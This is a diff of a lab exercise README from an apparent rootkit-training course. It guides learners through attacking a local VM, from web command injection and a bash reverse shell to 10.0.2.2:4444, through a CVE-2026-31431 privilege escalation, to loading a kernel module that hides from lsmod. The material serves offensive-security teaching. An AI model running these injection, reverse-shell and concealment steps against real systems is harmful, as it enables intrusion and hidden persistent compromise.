@@ -2,8 +2,8 @@
 
 ## Mission
 
-Every exercise so far started with a root shell on the target. That is almost
-never the starting position.
+Every exercise so far started with a root shell on the target.
+That is almost never the starting position.
 
 Deploying a rootkit means chaining several stages:
 
@@ -13,29 +13,41 @@ Deploying a rootkit means chaining several stages:
 4. Transfer the payload.
 5. Load it through whatever access you earned at each step.
 
-D00 puts you through this kill chain against a live target. You start with
-nothing but HTTP access to a service and end with a concealed, operational
-rootkit.
+D00 puts you through this kill chain against a live target.
+You start with nothing but HTTP access to a service and end with a concealed,
+operational rootkit.
+
+## What you will observe
+
+- Command injection on a web service gives initial access
+- A privilege escalation exploit (CVE-2026-31431) turns uid 1000 into root
+- Your rootkit module loads, hides, and responds to commands on a live target
+
+## Workspace
+
+No learner files to edit.
+This exercise is operational: follow the phases below using a browser, terminal,
+and the staged assets.
 
 ## Target
 
 ```text
 HOST                                    TARGET VM
 +-------------------+                   +------------------------+
-| rklings.ko        │                   | status-check :8080     |
-| copy_fail_exp.py  │                   | runs as uid 1000       |
-│                   │                   | no SSH, no sudo        |
+| rklings.ko        |                   | status-check :8080     |
+| copy_fail_exp.py  |                   | runs as uid 1000       |
+|                   |                   | no SSH, no sudo        |
 +--------+----------+                   +-----------+------------+
-         │        http://127.0.0.1:8088             |
+         |        http://127.0.0.1:8088             |
          +----------------------------------------->|
 ```
 
-The target runs Ubuntu 24.04 with kernel **6.8.0-101-generic**. This kernel
-version was chosen because it is vulnerable to CVE-2026-31431.
+The target runs Ubuntu 24.04 with kernel **6.8.0-101-generic**.
+This kernel version was chosen because it is vulnerable to CVE-2026-31431.
 
-The HTTP service is forwarded to `http://127.0.0.1:8088` on the host. It runs as
-`student` (uid 1000) with no sudo privileges. There is no learner SSH access to
-the guest.
+The HTTP service is forwarded to `http://127.0.0.1:8088` on the host.
+It runs as `student` (uid 1000) with no sudo privileges.
+There is no learner SSH access to the guest.
 
 `10.0.2.2` is the QEMU user-network address of the host, reachable from the
 guest.
@@ -44,10 +56,10 @@ guest.
 
 `rklings run D00` builds and stages two files on the host:
 
-| File               | Purpose                                  |
-| ------------------ | ---------------------------------------- |
+| File               | Purpose                                                |
+| ------------------ | ------------------------------------------------------ |
 | `rklings.ko`       | Your M01 module, built for the 6.8.0-101 target kernel |
-| `copy_fail_exp.py` | CVE-2026-31431 privilege escalation      |
+| `copy_fail_exp.py` | CVE-2026-31431 privilege escalation                    |
 
 Their path is printed at startup.
 
@@ -82,11 +94,11 @@ result = subprocess.run(
 )
 ```
 
-The `host` parameter is interpolated directly into a shell command. A semicolon
-terminates `getent` and starts a new command.
+The `host` parameter is interpolated directly into a shell command.
+A semicolon terminates `getent` and starts a new command.
 
-Open `http://127.0.0.1:8088` in a browser. Type `;id` in the host field and
-submit:
+Open `http://127.0.0.1:8088` in a browser.
+Type `;id` in the host field and submit:
 
 ```text
 uid=1000(student) gid=1000(student) groups=1000(student)
@@ -94,9 +106,9 @@ uid=1000(student) gid=1000(student) groups=1000(student)
 
 That proves code execution as `student`.
 
-One-shot HTTP responses are awkward for multi-step work. A callback shell gives
-you a persistent interactive session: the target connects back to a listener you
-run on the host.
+One-shot HTTP responses are awkward for multi-step work.
+A callback shell gives you a persistent interactive session: the target connects
+back to a listener you run on the host.
 
 Start a listener on the host:
 
@@ -104,14 +116,15 @@ Start a listener on the host:
 host:~$ nc -lvp 4444
 ```
 
-Submit a reverse shell through the web interface. A bash one-liner works:
+Submit a reverse shell through the web interface.
+A bash one-liner works:
 
 ```text
 ;bash -i >& /dev/tcp/10.0.2.2/4444 0>&1
 ```
 
-See https://getrev.sh for other payloads. Once the callback lands on the
-listener:
+See https://getrev.sh for other payloads.
+Once the callback lands on the listener:
 
 ```console
 student@target:~$ id
@@ -120,8 +133,9 @@ uid=1000(student) gid=1000(student) groups=1000(student)
 
 ## Phase 2: Serve the assets
 
-The exploit and the module are on the host. The target can reach the host at
-`10.0.2.2`. Serve the staged directory over HTTP from a second host terminal:
+The exploit and the module are on the host.
+The target can reach the host at `10.0.2.2`.
+Serve the staged directory over HTTP from a second host terminal:
 
 ```console
 host:~$ python3 -m http.server 9000 --directory .rklings/build/local-control-deployment
@@ -129,8 +143,8 @@ host:~$ python3 -m http.server 9000 --directory .rklings/build/local-control-dep
 
 ## Phase 3: Privilege escalation
 
-Loading a kernel module requires root. From the callback shell, transfer the
-exploit and run it:
+Loading a kernel module requires root.
+From the callback shell, transfer the exploit and run it:
 
 ```console
 student@target:~$ cd /tmp
@@ -141,8 +155,8 @@ root@target:/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-The exploit patched `/usr/bin/su` in the page cache. Running `su` drops to root
-without a password.
+The exploit patched `/usr/bin/su` in the page cache.
+Running `su` drops to root without a password.
 
 ## Phase 4: Deploy and conceal
 
@@ -163,7 +177,8 @@ root@target:/tmp# dmesg | tail -1
 rklings: pong
 ```
 
-`lsmod` returns nothing. The module still answers.
+`lsmod` returns nothing.
+The module still answers.
 
 ## Phase 5: Completion
 
@@ -177,7 +192,7 @@ host:~$ rklings complete D00
 `rklings complete` connects through a management channel, sends a ping, and
 verifies the module is hidden from `lsmod`.
 
-## Run
+## Test it
 
 ```console
 host:~$ rklings run D00
@@ -189,10 +204,10 @@ host:~$ rklings run D00
 host:~$ rklings validate D00
 ```
 
-
 ## Next
 
 You deployed by hand: injection, callback, escalation, transfer, load, hide.
 
-L14 starts automating this. The kernel module launches a userspace agent on its
-own, so the operator never needs a manual shell session on the target.
+L14 starts automating this.
+The kernel module launches a userspace agent on its own, so the operator never
+needs a manual shell session on the target.
